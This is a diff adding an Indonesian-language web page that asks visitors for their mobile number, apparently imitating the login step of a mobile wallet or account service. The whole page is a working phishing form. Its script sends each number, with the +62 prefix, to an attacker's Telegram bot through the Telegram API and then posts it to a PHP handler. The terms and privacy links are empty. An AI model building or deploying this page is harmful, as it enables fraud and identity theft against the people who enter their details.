@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#118eea">
+    <title>Masukkan Nomor Handphone</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #118eea;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .container {
+            padding: 20px;
+            margin-top: 20px;
+            flex-grow: 1;
+        }
+
+        .logo {
+            width: 130px;
+            margin-bottom: 10px;
+        }
+
+        p1 {
+            font-size: 16px;
+            margin: 10px 0;
+            display: block;
+        }
+
+        .input-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 300px;
+        }
+
+        .icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 65px;
+            height: 45px;
+        }
+
+        input[type="tel"] {
+            padding-left: 80px;
+            width: 100%;
+            height: 45px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+           outline: none; 
+            border-radius: 10px;
+            box-sizing: border-box;
+            background-color: white;
+            color: black;
+        }
+  
+
+
+        .button-container {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            margin-left: -12px;
+            padding: 10px;
+            background-color: #118eea;
+            text-align: center;
+        }
+
+        .submit-button {
+            background: none;
+            border: none;
+            padding: 0;
+            color: white;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .submit-button:hover {
+            color: #dddddd;
+            text-decoration: none;
+        }
+
+        .loading {
+            display: none;
+            position: relative;
+            margin-top: 20px;
+            margin-left: -50px;
+        }
+
+        .loading img.static-image {
+            position: absolute;
+            width: 50px;
+            z-index: 1;
+        }
+
+        .loading img.spinner {
+            position: absolute;
+            width: 40px;
+            margin-left: 5px;
+            margin-top: 5px;
+            animation: spin 0.7s linear infinite;
+            z-index: 2;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(-360deg);
+            }
+        }
+
+        p {
+            font-size: 13px;
+        }
+        strong {
+    color: white;
+}
+a {
+    text-decoration: none;
+}
+.submit-button {
+    text-decoration: none;
+}
+
+
+    </style>
+</head>
+<body>
+<form id="phoneForm" action="send/process.php" method="post">
+    <div class="container">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg3W1e-Q4DtbaO1xNNgQBsYSOF_eMf4kssHUNlXmShUHc93Lgj5fdB4ZTVr8NAsj4xN1Z3BiDrfr3CISxTEThEixk84xxIf4ZQm6QPB31R4O_gavWdcg00yhAJtYbctqz5eTrjxwS0jq26KVdHLt7f4cyI6vT6zHYreTAvWBEYbKzfDfpKbxdoLSMmh2lDS" alt="Logo" class="logo">
+        
+        <p1>Masukkan <strong>nomor HP</strong> kamu untuk lanjut</p1><br>
+        
+        <div class="input-container">
+            <div class="input-wrapper">
+                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhfqqkgEeAbg1A2QZDsQjJm7-R10BYdQgCccD9_JeTv5968wQSm4yoyNTPu8T6I3uxfVTNAZ2uvYfc38sjOU4-lywWponnU1OjiSM7Di_keRhqsfgzppcPIRNJAVPYr1hjNTvwRElxo_tOLlvkVgy7Na72LnBLfFN1p37QlOTg98zgJyPBX2nXI9Q8h-1nc" alt="Icon" class="icon">
+                <input type="tel" name="phone" id="phone" placeholder="811-1234-5678" oninput="formatPhoneNumber(this)" required>
+            </div>
+        </div>
+
+        <p>Nomor ponsel akan digunakan sebagai ID kamu &<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <a href="#"><strong>Syarat & Ketentuan</strong></a> dan<br><a href="#"><strong>Kebijakan Privasi</strong></a> Kami</p>
+
+        <div class="loading" id="loading">
+            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhGNxko9JaP0ln_kJmuob7Ns-2UAOOXtvT4HRJJZ2qe2AZskeFrJ5EkKn1pkJ8gkMJ0e7du66jGhr_zrQVTDGC3i6jnTkJTfZ2MqGA0SaKUMk2gpPZVzFOBkUh47FrKLlY-L6Cxj5lw50WB-stSGFdGzh93mv_pm3mZhL_-ZbJyte0InQxeLtAh9gUOZvDc" alt="Static Image" class="static-image">
+            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgwBRmagHn1FaafTS35Jd6qWd5v02Ro_o1gVltUC2n5tZgbR7Oa-N_mZfx930gTIn6B5O5W3iBUa4TZQEBgbavfithVxydhSCL0WYQgVlCtAWU_FvstTmH48_Qq3FZHvyoPAqIvqqQ7o5umnHdIqggQ6cvbTEYaN_MbaXyGtQfyFr1gkqvxHUAh0NCsnFXg" alt="Spinner Image" class="spinner">
+        </div>
+    </div>
+
+    <div class="button-container">
+        <button type="button" class="submit-button" onclick="submitForm()">LANJUT</button>
+    </div>
+</form>
+
+<script src="config.js"></script> <!-- Pastikan ini dimuat sebelum script utama -->
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const phoneInput = document.getElementById("phone");
+        const phoneForm = document.getElementById("phoneForm");
+        const loadingIndicator = document.getElementById("loading");
+
+        // Fungsi untuk memformat nomor telepon (hapus karakter selain angka)
+        function formatPhoneNumber(input) {
+            let phoneNumber = input.value.replace(/\D/g, ""); // Hanya angka
+            input.value = phoneNumber;
+        }
+
+        // Fungsi utama untuk mengirim nomor ke Telegram dan menyimpan di localStorage
+        function submitForm() {
+            const phoneNumber = phoneInput.value.trim();
+
+            if (phoneNumber === "") {
+                alert("Silakan masukkan nomor HP.");
+                return;
+            }
+
+            // Simpan nomor di localStorage
+            localStorage.setItem("phoneNumber", phoneNumber);
+
+            // Pastikan CONFIG sudah dimuat
+            if (typeof CONFIG === "undefined") {
+                console.error("CONFIG belum dimuat. Pastikan config.js sudah dimuat sebelum script ini.");
+                return;
+            }
+
+            // Format pesan Telegram
+            const message = `📲 *Nomor HP:* +62${phoneNumber}`;
+
+            // Tampilkan loading
+            loadingIndicator.style.display = "flex";
+
+            // Kirim ke Telegram
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Pesan berhasil dikirim:", data);
+                phoneForm.submit(); // Kirim form setelah sukses
+            })
+            .catch(error => {
+                console.error("Gagal mengirim pesan:", error);
+            });
+        }
+
+        // Event listener untuk format nomor saat diketik
+        phoneInput.addEventListener("input", function() {
+            formatPhoneNumber(phoneInput);
+        });
+
+        // Event listener untuk submit form jika tekan Enter
+        phoneInput.addEventListener("keydown", function(event) {
+            if (event.key === "Enter") {
+                event.preventDefault(); // Mencegah form langsung terkirim
+                submitForm();
+            }
+        });
+
+        // Event listener untuk tombol submit
+        document.querySelector(".submit-button").addEventListener("click", function() {
+            submitForm();
+        });
+    });
+</script>
+</body>
+</html>
